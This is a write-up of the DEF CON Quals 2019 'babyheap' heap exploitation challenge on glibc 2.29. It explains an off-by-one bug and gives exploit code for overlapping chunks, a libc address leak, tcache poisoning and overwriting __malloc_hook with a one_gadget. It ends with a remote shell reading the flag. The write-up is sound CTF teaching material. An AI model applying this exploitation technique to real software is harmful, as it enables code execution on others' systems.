---
title: "Defcon Qual 2019 - Babyheap"
description: "Defcon Qual CTF 2019 babyheap challenge writeup"
pubDate: "May 14 2019"
tags: ["ctf-writeup", "pwn", "heap"]
---

## intro

So, we get a heap pwn running with glibc 2.29 :0. Yes, this version of glibc already has the juicy tcache and introduce some mitigation (no simple double free, etc.).

Running this binary,

    -----Yet Another Babyheap!-----
    [M]alloc
    [F]ree
    [S]how
    [E]xit
    ------------------------
    Command:
    >

1.  `[M]alloc`, basically create chunk with 2 type of size 0xF8 and 0x178. Any size lower than that are set to the higher bound. So, for example, if you try to create chunk with size of 1, you’ll get `malloc(0xF8)` and chunk size of 0xF9 you’ll get `malloc(0x178)`.
2.  `[F]ree`, `memset(content, 0, chunk_request_size)` then `free()`, pointer also get NULLed at the end. So, no UaF i guess?
3.  `[S]how`, print the content of chunk.
4.  `[E]xit`, exit, ofc.

## off-by-one

In `[M]alloc`, user input to fill content handled like this,

```c
  read(0, &buf, 1);
  pos = 0;
  while (buf != '\n' && buf) {
    (*content)[pos] = buf;
    read(0, &buf, 1);
    if (chunk_request_size == pos++)
      return 0;
  }
```

see it? user input terminated when pos reached `chunk_request_size`, instead of `chunk_request_size-1`. This is clearly off-by-one.

## attack

We already have off-by-one in creating chunk, we can create an overlapping chunk with overwriting next chunk metadata. Then, use it to corrupt the tcache free list in overlapping chunks. Before all of that, we need to find libc leak, How? Lets start it with initialize the chunks we need.

```py
malloc(0x178, '0' * 0x178)
malloc(0xf8, '1' * 0xf8)
malloc(1, '2')
malloc(0x178, '3' * 0x178)
malloc(0x178, '4' * 0x178)
malloc(0xF8, '5' * 0xF8)
malloc(0x178, '6' * 0x178)
malloc(0x178, '7' * 0x178)
malloc(0x178, '8' * 0x178)
```

The idea is to corrupt chunk metadata (chunk size) to something larger than tcache could handle, for that we need to create overlapping chunk first.

```py
# setup overlapping chunk
free(0)
# overwrite metadata of chunk 1
malloc(0x178, '0' * 0x178 + '\x81')
```

Since we have overwritten the size of chunk 1, if we free this chunk, instead of going to `tcache[0x100]` it’ll go to `tcache[0x180]`. Because of that, if we create another request for `malloc(0x178)`, it’ll go directly to chunk 1 where the size should be 0x100 and overlapping with chunk 2. The content of chunk 1 can directly overwrite chunk 2, thus we will make chunk 2 size large enough and still pointing to a “valid” chunk.

```py
free(1)
# now chunk 1 and 2 are overlapping (after another
# malloc(0x178) request) since we want a libc leak,
# we need something large enough to pass tcache (> 0x500)
# and also the size need to point another chunk to
# pass some check, here I set the size to 0x681.
malloc(0x178, '1' * 0xf8 + p16(0x681))
```

Now, when chunk 2 gets freed, instead going to tcache bins, It’ll go to unsorted bins and get the fd bk populated (libc leak here). Also, remember that `[F]ree` clears the content for `chunk_request_size`? This is why I created chunk 2 with size of 1 (`malloc(1, '2'`), instead of the whole content get cleared, it’ll only clear the first byte of content/chunk.

```py
# Instead of goind to tcache bin free list, chunk2
# will goes to unsorted bin and we will get a nice
# libc leak
free(2)
malloc(1, 'A')

leak = show(2)
leak = u64(leak.ljust(8, '\x00'))

# main_arena trick
libc.address = (leak - libc.symbols['__malloc_hook']) & 0xFFFFFFFFFFFFF000

print 'LIBC', hex(libc.address)
```

After this we only need to do tcache poisoning, with creating another overlapping chunks first,

```py
# setting up another overlapping chunks
free(4)
malloc(0x178, '4' * 0x178 + '\x81')
free(6)
free(5)
```

then, do the tcache poisoning,

```py
# tcache poisoning
malloc(0x178, '5' * 0x100 +
	p64(libc.symbols['__malloc_hook']).replace('\x00', ''))
malloc(0x178, 'a')

# overwrite __malloc_hook with one_gadge
malloc(0x178,
	p64(libc.address + 0x106ef8).replace('\x00', ''))
free(8)
```

profit

```py
r.sendlineafter('> ', 'M') # trigger malloc
r.sendlineafter('> ', '1') # trigger malloc
```

## flaggg

```sh
λ › REMOTE=1 python2 solve.py
[+] Opening connection to babyheap.quals2019.oooverflow.io on port 5000: Done
LIBC 0x7f51a413b000
[*] Switching to interactive mode
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat /flag
OOO{4_b4byh34p_h45_nOOO_n4m3}
$
[*] Interrupted
[*] Closed connection to babyheap.quals2019.oooverflow.io port 5000
```
